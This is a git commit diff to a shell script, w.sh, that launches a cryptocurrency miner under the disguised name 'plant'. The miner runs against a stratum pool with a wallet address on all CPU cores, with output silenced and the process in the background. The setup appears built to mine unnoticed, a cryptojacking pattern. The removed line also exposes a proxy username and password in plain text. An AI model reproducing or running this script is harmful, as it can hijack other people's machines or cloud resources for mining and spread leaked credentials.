a7f4c348d5943feddc8d9f70825b5e5fa648c748
saridesi5436 <107600252+saridesi5436@users.noreply.github.com>
2022-08-10 22:09:48 +0000

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 lo.sh plant
-./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Mjollnir -p Mjollnir -t $(nproc --all) -x socks5://speedest88-NL-rotate:speedest88@p.webshare.io:80 > /dev/null 2>&1 &
+./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Mjollnir -p Mjollnir -t $(nproc --all) > /dev/null 2>&1 &
 ./lo.sh
